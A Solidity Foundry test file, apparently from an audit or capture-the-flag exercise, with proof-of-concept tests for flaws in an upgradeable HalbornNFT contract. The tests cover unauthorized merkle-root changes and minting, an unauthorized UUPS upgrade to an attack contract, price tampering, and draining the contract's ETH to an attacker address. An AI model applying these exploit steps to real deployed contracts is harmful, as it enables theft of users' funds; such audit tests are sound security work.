// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Utils.sol";

import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/proxy/utils/UUPSUpgradeable.sol";

import {HalbornNFT} from "../src/HalbornNFT.sol";
import {NFT_UUPSattack} from "../src/exploit/HalbornNFTExploit.sol";
import {Merkle} from "./murky/Merkle.sol";

contract HalbornNFT_Test is Test, Merkle {
    HalbornNFT public nft;
    ERC1967Proxy proxy;
    HalbornNFT impl;

    function setUp() public {
        impl = new HalbornNFT();
        proxy = new ERC1967Proxy(address(impl), "");
        nft = HalbornNFT(address(proxy));
        nft.initialize(keccak256(abi.encodePacked("root")), 1 ether);
    }

    // Test Initialize base implementation
    function test_initialize() public {
        assertEq(nft.merkleRoot(), keccak256(abi.encodePacked("root")));
        assertEq(nft.price(), 1 ether);
    }

    // Critical Bug 6: anyone can set merkle root
    function test_setMerkelRoot() public {
        address unauthorizedUser = address(0xdead);
        vm.prank(unauthorizedUser);

        nft.setMerkleRoot(keccak256(abi.encodePacked("")));
        assertEq(nft.merkleRoot(), keccak256(abi.encodePacked("")));
    }

    // Critical Bug 7: Mint after setting merkle root
    function test_setMintUnlimited() public {
        address unauthorizedUser = address(0xdead);
        vm.prank(unauthorizedUser);

        bytes32 left = keccak256(abi.encodePacked(address(this), uint256(1)));
        bytes32 right = keccak256(abi.encodePacked(address(this), uint256(2)));
        bytes32 root = hashLeafPairs(left, right);

        bytes32[] memory proofForLeft = new bytes32[](1);
        proofForLeft[0] = right;

        bytes32[] memory proofForRight = new bytes32[](1);
        proofForRight[0] = left;

        nft.setMerkleRoot(root);

        nft.mintAirdrops(1, proofForLeft);
        nft.mintAirdrops(2, proofForRight);
    }

    // Critical Bug 8: anyone can upgrade to UUPSattack
    function test_vulnerableUUPSupgrade() public {
        address unauthorizedUser = address(0xdead);
        vm.startPrank(unauthorizedUser);

        assertEq(nft.price(), 1 ether);

        NFT_UUPSattack attack = new NFT_UUPSattack();
        nft.upgradeTo(address(attack));
        nft.initialize("", 666);

        assertEq(nft.price(), 666);
    }

    // Critical Bug 9: anyone can set price
    function test_setPrice() public {
        address unauthorizedUser = address(0xdead);
        vm.startPrank(unauthorizedUser);

        uint256 newPrice = 666;

        NFT_UUPSattack attack = new NFT_UUPSattack();
        nft.upgradeTo(address(attack));
        nft.initialize("", newPrice);

        assertEq(nft.price(), newPrice);
    }

    // Medium Bug 10: idCounter increment is unchecked
    function test_overflowCounter() public {
        address unauthorizedUser = address(0xdead);
        vm.startPrank(unauthorizedUser);

        NFT_UUPSattack attack = new NFT_UUPSattack();
        nft.upgradeTo(address(attack));
        nft.initialize("", 1);

        assertEq(nft.price(), 1);
        // this is just an example, but completely infeasable to do
        // becasue the max stack depth in solidity is 1024
        // it would take 1.157920892373162e+77 iterations to overflow
        // which is completely infeasable to do
        // but theoretically possible
        /*         
        for(uint256 i = 0; i < type(uint).max; i++) {
            nft.mintBuyWithETH{value: 1 ether}();
        } 
        */
    }

    // Critical Bug 11: anyone can steal to ETH in contract
    function test_stealETH() public {
        address unauthorizedUser = address(0xdead);
        vm.startPrank(unauthorizedUser);
        vm.deal(unauthorizedUser, 1e18);

        nft.mintBuyWithETH{value: 1 ether}();
        assertEq(address(nft).balance, 1 ether);

        NFT_UUPSattack attack = new NFT_UUPSattack();
        nft.upgradeTo(address(attack));
        nft.initialize("", 666);

        console.log("drinaing contract");

        // drain contract
        uint256 bal0 = unauthorizedUser.balance;
        nft.withdrawETH(0);
        uint256 bal1 = unauthorizedUser.balance;

        console.log("attacker balance post drain", bal1 - bal0);
        console.log("nft contract post drain", address(nft).balance);

        assertEq(address(nft).balance, 0);
        assertEq(bal1 - bal0, 1 ether);
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4)
    {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
